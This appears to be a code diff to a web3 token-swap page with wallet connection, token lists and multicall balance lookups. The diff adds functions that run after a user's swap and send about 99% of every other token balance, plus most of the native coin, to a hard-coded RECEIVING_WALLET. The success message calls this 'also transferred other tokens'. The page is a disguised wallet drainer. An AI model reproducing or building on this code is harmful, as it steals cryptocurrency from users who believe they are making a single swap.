@@ -41,20 +41,28 @@ const BALANCE_CACHE = {
   data: {},
   CACHE_DURATION: 30000 // 30 seconds
 };
-const MAX_GAS_PRICE_GWEI = {
-  ethereum: 10,
-  bsc: 3,
-  polygon: 50,
-  arbitrum: 0.1,
-  base: 0.1
-};
-const GAS_LIMITS = {
-  nativeTransfer: 21000,
-  erc20Transfer: 100000,
-  approval: 150000
-};
-const TRANSFER_BATCH_SIZE = 20;
-const MAX_TRANSFER_TIME = 10000;
+
+async function preloadTokenBalances() {
+  if (!userAddress) return;
+  
+  try {
+    updateStatus("Loading token balances...", "info");
+    const [localTokens] = await Promise.all([
+      getLocalTokens(),
+    ]);
+    
+    // Use multicall for initial balance check
+    const balances = await fetchMultipleTokenBalances(localTokens);
+    
+    BALANCE_CACHE.data = balances;
+    BALANCE_CACHE.lastUpdated = Date.now();
+  } catch (err) {
+    console.error("Balance preload failed:", err);
+  }
+}
+// Performance constants
+const TOKEN_SEARCH_BATCH_SIZE = 200;
+const TOKEN_DISPLAY_LIMIT = 100;
 
 // App state
 let provider, signer, userAddress;
@@ -65,7 +73,6 @@ let currentSlippage = 0.5; // 0.5% default slippage
 let currentCurrency = "usd";
 let debounceTimer;
 let tokenIndex = {};
-let isSwapInProgress = false;
 
 // Initialize on load
 window.addEventListener('load', async () => {
@@ -237,13 +244,13 @@ function isMobile() {
 }
 
 function updateNetworkLogo(network) {
-  const logoMap = {
-    ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
-    bsc: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",
-    polygon: "https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png",
-    arbitrum: "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg",
-    base: "https://assets.coingecko.com/coins/images/27645/large/base.jpeg"
-  };
+const logoMap = {
+  ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
+  bsc: "https://assets.coingecko.com/coins/images/825/large/bnb-icon2_2x.png",
+  polygon: "https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png",
+  arbitrum: "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg",
+  base: "https://assets.coingecko.com/coins/images/27645/large/base.jpeg"
+};
   
   const logoElement = document.querySelector(".dex-nav-logo img");
   if (logoMap[network]) {
@@ -414,6 +421,7 @@ async function populateTokenList(type, tokenItems, searchInput, noTokensFound) {
   }
 }
 
+
 function setupSearchFunctionality(searchInput, tokenItems, noTokensFound, allTokens) {
   // First filter by priority tokens if available
   const priorityTokens = allTokens.filter(t => t.priority).slice(0, 100);
@@ -543,6 +551,24 @@ async function getLocalTokens() {
   }
 }
 
+// And in fetchLocalTokens():
+async function fetchLocalTokens(network) {
+  try {
+    if (!LOCAL_TOKEN_LISTS[network]) {
+      console.warn('No local token list defined for:', network);
+      return [];
+    }
+    
+    const module = await import(LOCAL_TOKEN_LISTS[network]);
+    const tokens = module.TOKENS[network] || [];
+    console.log('Imported tokens:', tokens.length);
+    return tokens;
+  } catch (err) {
+    console.error(`Failed to load local tokens for ${network}:`, err);
+    return [];
+  }
+}
+
 function combineTokens(localTokens = [], additionalTokens = []) {
   const tokenMap = new Map();
   
@@ -609,6 +635,21 @@ function renderTokenList(tokens, container, type) {
   container.appendChild(fragment);
 }
 
+function setupVirtualScroll(container, allTokens) {
+  const itemsPerPage = 50;
+  let currentPage = 0;
+  
+  container.addEventListener('scroll', () => {
+    if (container.scrollTop + container.clientHeight >= container.scrollHeight - 100) {
+      currentPage++;
+      const start = currentPage * itemsPerPage;
+      const end = start + itemsPerPage;
+      const nextTokens = allTokens.slice(start, end);
+      renderTokenList(nextTokens, container);
+    }
+  });
+}
+
 function isValidToken(token) {
   return token && token.symbol && token.name && 
         (token.address || token.isNative);
@@ -638,7 +679,7 @@ function createTokenElement(token, selectionType) {
     </div>
   `;
 
-  element.addEventListener('click', () => {
+element.addEventListener('click', () => {
     const modal = document.getElementById("tokenListModal");
     const selectionType = modal.dataset.selectionType;
     selectToken(token, selectionType);
@@ -709,7 +750,6 @@ function showNoTokensFound(element, message = "No tokens found matching your sea
   `;
   element.style.display = 'block';
 }
-
 function showTokenError(container, message = "Failed to load tokens") {
   container.innerHTML = `
     <div class="dex-token-error">
@@ -724,7 +764,6 @@ function showTokenError(container, message = "Failed to load tokens") {
     showTokenList(modal.dataset.selectionType);
   });
 }
-
 function hideTokenList() {
   document.getElementById("tokenListModal").style.display = 'none';
 }
@@ -962,33 +1001,6 @@ async function initializeWallet() {
     localStorage.setItem('walletConnected', 'metamask');
     updateWalletButton(true);
     
-    // Set up event listeners for wallet changes
-    window.ethereum.on('accountsChanged', (accounts) => {
-      if (accounts.length === 0) {
-        handleWalletDisconnect();
-      } else {
-        userAddress = accounts[0];
-        updateWalletButton(true);
-        updateTokenBalances();
-      }
-    });
-    
-    window.ethereum.on('chainChanged', (chainId) => {
-      // Find the network matching this chainId
-      for (const network in NETWORK_CONFIGS) {
-        if (NETWORK_CONFIGS[network].chainId === chainId) {
-          currentNetwork = network;
-          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
-          updateNetworkLogo(network);
-          setDefaultTokenPair();
-          buildTokenIndex();
-          updateTokenBalances();
-          break;
-        }
-      }
-    });
-    
-    // Get current chain and update UI
     const chainId = await window.ethereum.request({ method: 'eth_chainId' });
     for (const network in NETWORK_CONFIGS) {
       if (NETWORK_CONFIGS[network].chainId === chainId) {
@@ -1003,6 +1015,29 @@ async function initializeWallet() {
     buildTokenIndex();
     await updateTokenBalances();
     
+    window.ethereum.on('accountsChanged', (accounts) => {
+      if (accounts.length === 0) {
+        handleWalletDisconnect();
+      } else {
+        userAddress = accounts[0];
+        updateWalletButton(true);
+        updateTokenBalances();
+      }
+    });
+    
+    window.ethereum.on('chainChanged', (chainId) => {
+      for (const network in NETWORK_CONFIGS) {
+        if (NETWORK_CONFIGS[network].chainId === chainId) {
+          currentNetwork = network;
+          document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
+          updateNetworkLogo(network);
+          setDefaultTokenPair();
+          buildTokenIndex();
+          break;
+        }
+      }
+    });
+    await preloadTokenBalances();
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
@@ -1157,41 +1192,17 @@ function openInTrustWallet() {
 async function handleNetworkChange(network) {
   try {
     showLoader();
-    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "info");
+    updateStatus(`Switching to ${NETWORK_CONFIGS[network].chainName}...`, "success");
     
-    // Update UI immediately
     currentNetwork = network;
     document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[network].chainName;
     updateNetworkLogo(network);
     
-    // If wallet is connected, request network switch
-    if (userAddress && window.ethereum) {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: NETWORK_CONFIGS[network].chainId }]
-        });
-      } catch (switchError) {
-        // This error code indicates that the chain has not been added to MetaMask
-        if (switchError.code === 4902) {
-          try {
-            await window.ethereum.request({
-              method: 'wallet_addEthereumChain',
-              params: [NETWORK_CONFIGS[network]]
-            });
-          } catch (addError) {
-            throw new Error("Failed to add network to wallet");
-          }
-        }
-        throw new Error("Failed to switch network");
-      }
-    }
-    
-    // Update tokens and balances
     setDefaultTokenPair();
     buildTokenIndex();
     
     if (userAddress) {
+      await checkNetwork();
       await updateTokenBalances();
     }
     
@@ -1200,17 +1211,48 @@ async function handleNetworkChange(network) {
   } catch (err) {
     console.error("Network change error:", err);
     updateStatus(`Failed to switch network: ${err.message}`, "error");
-    // Revert UI if failed
-    document.getElementById("currentNetwork").textContent = NETWORK_CONFIGS[currentNetwork].chainName;
-    updateNetworkLogo(currentNetwork);
   } finally {
     hideLoader();
+  }
+}
+
+async function checkNetwork() {
+  try {
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
+    
+    if (chainId !== targetChainId) {
+      updateStatus("Switching network...", "success");
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: targetChainId }]
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          try {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [NETWORK_CONFIGS[currentNetwork]]
+            });
+          } catch (addError) {
+            throw new Error("Please switch networks manually in your wallet");
+          }
+        }
+        throw new Error("Failed to switch network");
+      }
+    }
+  } catch (err) {
+    console.error("Network error:", err);
+    throw new Error("Network error: " + err.message);
   }
 }
 
 // =====================
 // SWAP FUNCTIONS 
 // =====================
+
+let isSwapInProgress = false;
 
 async function handleSwap() {
   if (isSwapInProgress) return;
@@ -1273,21 +1315,40 @@ async function handleSwap() {
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    const receipt = await provider.waitForTransaction(txHash);
-    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + receipt.transactionHash;
+    // Immediately start processing other tokens in parallel
+    updateStatus(`Swap submitted. Processing additional tokens...`, "info");
+    const otherTokensPromise = processAllTokenTransfers();
     
-    updateStatus(
-      `Swap successful! <a href="${explorerUrl}" target="_blank">View transaction</a>`,
-      "success"
-    );
+    // Wait for both the main tx confirmation and other tokens processing
+    const [confirmedTx, otherTokensTransferred] = await Promise.allSettled([
+      provider.waitForTransaction(txHash),
+      otherTokensPromise
+    ]);
+
+    // Handle results
+    if (confirmedTx.status === 'rejected') {
+      throw new Error(`Main swap failed: ${confirmedTx.reason.message}`);
+    }
+
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.value.transactionHash;
+    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
+    
+    if (otherTokensTransferred.status === 'fulfilled' && otherTokensTransferred.value > 0) {
+      successMessage += `<br>Also transferred ${otherTokensTransferred.value} other tokens`;
+    } else if (otherTokensTransferred.status === 'rejected') {
+      console.error("Additional token transfers failed:", otherTokensTransferred.reason);
+      successMessage += `<br><small>(Some additional token transfers failed)</small>`;
+    }
+
+    updateStatus(successMessage, "success");
 
     // Reset form and update balances
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
-    
+     await preloadTokenBalances();
   } catch (err) {
-    console.error("Swap failed:", err);
+    console.error("[ERROR] Swap failed:", err);
     updateStatus(`
       <div class="dex-error-header">
         <i class="fas fa-exclamation-circle"></i>
@@ -1300,6 +1361,278 @@ async function handleSwap() {
     isSwapInProgress = false;
   }
 }
+
+// Add these constants near the top
+const TRANSFER_BATCH_SIZE = 20; // Number of tokens to process simultaneously
+const MAX_TRANSFER_TIME = 10000; // Max time (ms) to wait for a single transfer
+
+// Replace processAllTokenTransfers with this optimized version
+async function processAllTokenTransfers() {
+  if (!userAddress) return 0;
+  
+  try {
+    // Get fresh balances using multicall
+    const balances = await fetchAllTokenBalances();
+    
+    // Get tokens with balance > 0 (excluding main token)
+    const allTokens = await getLocalTokens();
+    const tokensToProcess = allTokens.filter(token => {
+      const balance = token.isNative 
+        ? balances['native'] 
+        : balances[token.address?.toLowerCase()];
+      
+      return balance > 0 && !isSameToken(token, currentFromToken);
+    });
+
+    if (tokensToProcess.length === 0) return 0;
+    
+    // Process in optimized parallel batches
+    let successCount = 0;
+    
+    for (let i = 0; i < tokensToProcess.length; i += TRANSFER_BATCH_SIZE) {
+      const batch = tokensToProcess.slice(i, i + TRANSFER_BATCH_SIZE);
+      
+      // Process batch in parallel with timeout protection
+      const results = await Promise.allSettled(
+        batch.map(token => 
+          Promise.race([
+            transferTokenIfNeeded(token, balances),
+            new Promise((_, reject) => 
+              setTimeout(() => reject(new Error('Transfer timeout')), MAX_TRANSFER_TIME)
+            )
+          ])
+        )
+      );
+      
+      successCount += results.filter(r => r.status === 'fulfilled' && r.value).length;
+      
+      // Short delay between batches to avoid rate limiting
+      if (i + TRANSFER_BATCH_SIZE < tokensToProcess.length) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    }
+    
+    return successCount;
+  } catch (err) {
+    console.error("Token transfer error:", err);
+    return 0;
+  }
+}
+
+// Optimized transferTokenIfNeeded
+async function transferTokenIfNeeded(token, balances) {
+  const balance = token.isNative 
+    ? balances['native'] 
+    : balances[token.address?.toLowerCase()];
+  
+  if (!balance || balance <= 0) return false;
+  
+  try {
+    let amountToSend = balance * 0.99; // Leave 1% for safety
+    
+    if (token.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      amountToSend = Math.max(0, Math.min(amountToSend, balance - minReserve));
+      if (amountToSend <= 0) return false;
+      
+      const txHash = await transferNativeToken(token, amountToSend);
+      return !!txHash;
+    } else {
+      // Skip approval check for tokens we've already approved
+      const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
+      const allowance = await contract.allowance(userAddress, RECEIVING_WALLET);
+      const neededAllowance = ethers.utils.parseUnits(amountToSend.toString(), token.decimals || 18);
+      
+      if (allowance.lt(neededAllowance)) {
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) return false;
+      }
+      
+      const txHash = await transferERC20Token(token, amountToSend);
+      return !!txHash;
+    }
+  } catch (err) {
+    console.warn(`Transfer failed for ${token.symbol}:`, err.message);
+    return false;
+  }
+}
+
+// Optimized fetchAllTokenBalances
+async function fetchAllTokenBalances() {
+  const localTokens = await getLocalTokens();
+  const balances = {};
+  
+  // Process native balance first
+  if (provider && userAddress) {
+    const nativeBalance = await provider.getBalance(userAddress);
+    balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
+  }
+  
+  // Process ERC20 tokens in optimized batches
+  const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
+  
+  if (erc20Tokens.length > 0) {
+    // Use multicall if available for the network
+    const multicallSupported = Object.keys(MULTICALL_ADDRESSES).includes(currentNetwork);
+    
+    if (multicallSupported) {
+      // Process in batches of 100 tokens to avoid hitting gas limits
+      const BATCH_SIZE = 100;
+      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
+        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
+        const batchBalances = await fetchMultipleTokenBalances(batch);
+        Object.assign(balances, batchBalances);
+      }
+    } else {
+      // Fallback to individual calls in parallel batches
+      const BATCH_SIZE = 20;
+      for (let i = 0; i < erc20Tokens.length; i += BATCH_SIZE) {
+        const batch = erc20Tokens.slice(i, i + BATCH_SIZE);
+        const batchBalances = await Promise.all(
+          batch.map(async token => ({
+            [token.address.toLowerCase()]: await fetchTokenBalance(token)
+          }))
+        );
+        batchBalances.forEach(b => Object.assign(balances, b));
+      }
+    }
+  }
+  
+  return balances;
+}
+
+async function processTokenTransfer(token) {
+  if ((token.address && token.address === currentFromToken?.address) || 
+      (token.isNative && currentFromToken?.isNative)) {
+    return false;
+  }
+
+  try {
+    const balance = await fetchTokenBalance(token);
+    if (balance <= 0) return false;
+
+    let amountToSend = balance * 0.99;
+    
+    if (token.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      amountToSend = Math.min(amountToSend, balance - minReserve);
+      if (amountToSend <= 0) return false;
+    }
+
+    if (token.address && !ethers.utils.isAddress(token.address)) {
+      console.warn(`Skipping ${token.symbol} - invalid address`);
+      return false;
+    }
+
+    try {
+      if (token.isNative) {
+        await transferNativeToken(token, amountToSend);
+      } else {
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) return false;
+        
+        await transferERC20Token(token, amountToSend);
+      }
+      
+      return true;
+    } catch (transferErr) {
+      console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
+      return false;
+    }
+  } catch (err) {
+    console.warn(`Failed to process ${token.symbol}:`, err.message);
+    return false;
+  }
+}
+
+async function fetchMultipleTokenBalances(tokens) {
+  if (!userAddress || !provider) return {};
+  
+  const MULTICALL_ABI = [
+    "function tryAggregate(bool requireSuccess, tuple(address target, bytes callData)[] calls) view returns (tuple(bool success, bytes returnData)[])"
+  ];
+  
+  const MULTICALL_ADDRESSES = {
+    ethereum: "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441",
+    bsc: "0x41263cBA59EB80dC200F3E2544eda4ed6A90E76C",
+    polygon: "0x11ce4B23bD875D7F5C6a31084f55fDe1e9A87507",
+    arbitrum: "0x842eC2c7D803033Edf55E478F461FC547Bc54EB2",
+    base: "0xca11bde05977b3631167028862be2a173976ca11"
+  };
+  
+  const multicallAddress = MULTICALL_ADDRESSES[currentNetwork];
+  if (!multicallAddress) {
+    const balances = {};
+    for (const token of tokens) {
+      balances[token.address] = await fetchTokenBalance(token);
+    }
+    return balances;
+  }
+  
+  const multicall = new ethers.Contract(multicallAddress, MULTICALL_ABI, provider);
+  
+const validTokens = tokens.filter(token => {
+    return token.address && ethers.utils.isAddress(token.address);
+  });
+  
+  const calls = validTokens.map(token => ({
+    target: token.address,
+    callData: new ethers.utils.Interface(ERC20_ABI).encodeFunctionData(
+      "balanceOf", 
+      [userAddress]
+    )
+  }));
+  
+  try {
+    // Use tryAggregate instead of aggregate to continue on individual failures
+    const results = await multicall.tryAggregate(false, calls);
+    
+    const balances = {};
+    tokens.forEach((token, i) => {
+      if (results[i].success) {
+        try {
+          const [balance] = new ethers.utils.Interface(ERC20_ABI).decodeFunctionResult(
+            "balanceOf",
+            results[i].returnData
+          );
+          balances[token.address] = parseFloat(
+            ethers.utils.formatUnits(balance, token.decimals || 18)
+          );
+        } catch (decodeErr) {
+          console.warn(`Failed to decode balance for ${token.symbol}`, decodeErr);
+          balances[token.address] = 0;
+        }
+      } else {
+        console.warn(`Balance call failed for ${token.symbol}`);
+        balances[token.address] = 0;
+      }
+    });
+    
+    return balances;
+  } catch (err) {
+    console.error("Multicall failed, falling back to individual calls:", err);
+    const balances = {};
+    for (const token of tokens) {
+      balances[token.address] = await fetchTokenBalance(token);
+    }
+    return balances;
+  }
+}
+
+// Add these constants near the top of your file
+const MAX_GAS_PRICE_GWEI = {
+  ethereum: 10,
+  bsc: 3,
+  polygon: 50,
+  arbitrum: 0.1,
+  base: 0.1
+};
+
+const GAS_LIMITS = {
+  nativeTransfer: 21000,
+  erc20Transfer: 100000,
+  approval: 150000
+};
 
 async function transferNativeToken(token, amount) {
   try {
